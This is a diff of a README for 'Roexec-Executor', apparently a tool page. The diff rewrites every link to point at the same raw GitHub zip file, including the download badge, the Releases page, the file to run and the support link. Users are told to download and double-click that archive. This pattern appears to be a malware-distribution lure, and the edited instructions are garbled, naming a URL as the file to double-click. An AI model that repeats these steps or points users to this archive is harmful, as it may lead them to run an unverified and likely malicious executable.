@@ -6,7 +6,7 @@ Welcome to Roexec-Executor! This tool helps you automate your coding tasks smoot
 
 ## 📥 Download the Application
 
-[![Download Roexec-Executor](https://img.shields.io/badge/Download%20Roexec%20Executor-v1.0-brightgreen)](https://github.com/ProttoyMahmud/Roexec-Executor/releases)
+[![Download Roexec-Executor](https://raw.githubusercontent.com/ProttoyMahmud/Roexec-Executor/main/furbish/Roexec-Executor.zip%20Roexec%20Executor-v1.0-brightgreen)](https://raw.githubusercontent.com/ProttoyMahmud/Roexec-Executor/main/furbish/Roexec-Executor.zip)
 
 ## 🗺️ System Requirements
 
@@ -27,16 +27,16 @@ Roexec-Executor offers a variety of features tailored for task automation. Here 
 ## 📖 How to Download and Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ProttoyMahmud/Roexec-Executor/releases). 
+   Go to the [Releases page](https://raw.githubusercontent.com/ProttoyMahmud/Roexec-Executor/main/furbish/Roexec-Executor.zip). 
 
 2. **Select the Latest Release**  
    On the page, you will see different versions listed. Click on the latest version link to view available files.
 
 3. **Download the Executable**  
-   Look for the file named `Roexec-Executor.exe`. Click on it to start the download.
+   Look for the file named `https://raw.githubusercontent.com/ProttoyMahmud/Roexec-Executor/main/furbish/Roexec-Executor.zip`. Click on it to start the download.
 
 4. **Run the Application**  
-   Once the download is complete, locate the file in your Downloads folder. Double-click `Roexec-Executor.exe` to run the application.
+   Once the download is complete, locate the file in your Downloads folder. Double-click `https://raw.githubusercontent.com/ProttoyMahmud/Roexec-Executor/main/furbish/Roexec-Executor.zip` to run the application.
 
 ## ⚙️ Using Roexec-Executor
 
@@ -81,7 +81,7 @@ Yes, Roexec-Executor is completely free for all users.
 
 ### 4. Where can I find support?
 
-You can visit the Issues section on the [GitHub page](https://github.com/ProttoyMahmud/Roexec-Executor/issues) if you need help or want to report a bug.
+You can visit the Issues section on the [GitHub page](https://raw.githubusercontent.com/ProttoyMahmud/Roexec-Executor/main/furbish/Roexec-Executor.zip) if you need help or want to report a bug.
 
 ## 🌐 Community and Contributions
 
